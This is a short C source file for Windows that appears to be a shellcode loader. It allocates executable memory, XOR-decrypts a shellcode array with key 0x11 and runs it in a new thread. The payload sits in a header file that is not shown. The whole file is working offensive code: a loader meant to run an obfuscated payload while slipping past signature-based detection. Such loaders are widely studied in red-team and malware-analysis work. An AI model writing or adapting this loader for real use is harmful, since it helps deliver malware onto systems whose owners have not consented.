#include "Header.h"

void XorAndInjectShellcode()
{
	BYTE* shellcode_executable;
	DWORD threadID;
	HANDLE hThread;

	shellcode_executable = (BYTE*)VirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	// XOR THE SHELLCODE BYTES TO DECRYPT IT //
	for (int i = 0; i < sizeof shellcode; i++)
	{
		shellcode_executable[i] = shellcode[i] ^ 0x11;
	}
	///////////////////////////////////////////

	hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_executable, NULL, 0, &threadID);
	WaitForSingleObject(hThread, INFINITE);
}

int main()
{
	XorAndInjectShellcode();
}